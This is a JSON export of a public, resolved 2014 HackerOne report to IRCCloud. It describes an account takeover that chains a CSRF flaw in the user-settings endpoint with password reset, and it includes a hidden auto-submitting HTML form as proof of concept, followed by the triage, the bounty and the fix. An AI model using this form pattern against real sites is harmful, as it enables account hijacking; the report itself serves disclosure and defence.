{"id":6910,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTEw","url":"https://hackerone.com/reports/6910","title":"Full account takeover using CSRF and password reset","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-04-10T23:05:03.401Z","submitted_at":"2014-04-10T23:05:03.401Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"melvin","url":"/melvin","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":140,"url":"https://hackerone.com/irccloud","handle":"irccloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"IRCCloud","twitter_handle":"irccloud","website":"https://www.irccloud.com","about":"Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-04-14T13:43:11.749Z","bug_reporter_agreed_on_going_public_at":"2014-04-12T16:00:44.821Z","team_member_agreed_on_going_public_at":"2014-04-14T13:43:11.546Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An attacker could take over any user account by doing the following things.\r\n\r\n1) Exploit a CSRF vulnerability in `/chat/user-settings`.  An attacker creates a webpage on a (non-IRCCloud) website (for example: http://example.com/cat.html) and inserts a (hidden) form like this:\r\n\r\n    \u003cform action=\"https://www.irccloud.com/chat/user-settings\" method=\"post\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"email\" value=\"hacker@example.com\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"realname\" value=\"Doesn't Matter\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"hwords\" value=\"\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"autoaway\" value=\"1\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"reqid\" value=\"1\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"session\" value=\"\"\u003e\r\n    \u003cinput type=\"submit\"\u003e \r\n    \u003c!-- some code to make the form submit automatically, in the  background--\u003e\r\n    \u003c/form\u003e\r\n\r\n2) The attacker will send a link to the page to the victim. When the victim is logged in to IRCCloud, and clicks the link to the page, the e-mail of the victim on IRCCloud will be updated (in the background) to `hacker@example.com`.\r\n\r\n3) The attacker will receive an e-mail to confirm the e-mail address (see: mail.png).\r\n\r\n4) The attacker can now use the password reset functionality to change the password of the victim's account and gain full control over the account.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-05-12T15:51:47.441Z","allow_singular_disclosure_after":-234055578.2621599,"singular_disclosure_allowed":true,"vote_count":5,"voters":["arifmkhls","cryptographer","nafisaqil","hdarji","sbavis20"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":28249,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's the image.","automated_response":false,"created_at":"2014-04-10T23:06:09.204Z","updated_at":"2014-04-10T23:06:09.204Z","actor":{"username":"melvin","cleared":false,"url":"/melvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":6148,"filename":"mail.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/006/148/19215764dcee88987417c1447b41fa8544fe442c/mail.png?response-content-disposition=attachment%3B%20filename%3D%22mail.png%22%3B%20filename%2A%3DUTF-8%27%27mail.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151805Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=93179d41df4eaa8d7a92926d3c6aea27d9f2a379271892f3e1a73cce5f4cd40e"}],"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":28540,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I should add that there are two bugs to fix:\n1)  The CSRF vulnerability\n2)  The e-mail is changed **before** confirmation","automated_response":false,"created_at":"2014-04-11T08:37:32.412Z","updated_at":"2014-04-11T08:37:32.412Z","actor":{"username":"melvin","cleared":false,"url":"/melvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":29343,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please let me know if you need any help resolving this issue. I believe the impact is quite high, because a 'bad guy' can send the link in one of the IRCCloud channels and compromise dozens of accounts at once, or easily target someone of the IRCCloud staff.","automated_response":false,"created_at":"2014-04-12T13:55:55.197Z","updated_at":"2014-04-12T13:56:38.027Z","actor":{"username":"melvin","cleared":false,"url":"/melvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":29346,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for reporting, we're aware of this issue and we'll be back in touch soon.","automated_response":false,"created_at":"2014-04-12T14:01:01.564Z","updated_at":"2014-04-12T14:01:01.564Z","actor":{"username":"russss","cleared":false,"url":"/russss","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/786/b539136875027662b8b5aefbacce2c7d8ab11837_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":29385,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks, we have now fixed this bug.","automated_response":false,"created_at":"2014-04-12T15:51:47.585Z","updated_at":"2014-04-12T15:51:47.585Z","actor":{"username":"russss","cleared":false,"url":"/russss","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/786/b539136875027662b8b5aefbacce2c7d8ab11837_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"melvin","url":"/melvin"},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":29387,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2014-04-12T15:51:56.505Z","updated_at":"2014-04-12T15:51:56.505Z","actor":{"url":"/irccloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"IRCCloud"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"irccloud","collaborator":{"username":"melvin","url":"/melvin"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":29400,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Looks good! Thank you.","automated_response":false,"created_at":"2014-04-12T16:00:44.835Z","updated_at":"2014-04-12T16:00:44.835Z","first_to_agree":true,"actor":{"username":"melvin","cleared":false,"url":"/melvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":30047,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2014-04-14T13:43:11.563Z","updated_at":"2014-04-14T13:43:11.563Z","actor":{"username":"jwheare","cleared":false,"url":"/jwheare","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/778/b500b506bad385a82e5e0da28a0214d263822656_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":30048,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2014-04-14T13:43:11.773Z","updated_at":"2014-04-14T13:43:11.773Z","actor":{"username":"jwheare","cleared":false,"url":"/jwheare","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/778/b500b506bad385a82e5e0da28a0214d263822656_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":30058,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For the public record, this was an issue only affecting forms that didn't involve an IRC connection cid.","automated_response":false,"created_at":"2014-04-14T13:49:06.315Z","updated_at":"2014-04-14T13:49:06.315Z","actor":{"username":"jwheare","cleared":false,"url":"/jwheare","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/778/b500b506bad385a82e5e0da28a0214d263822656_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}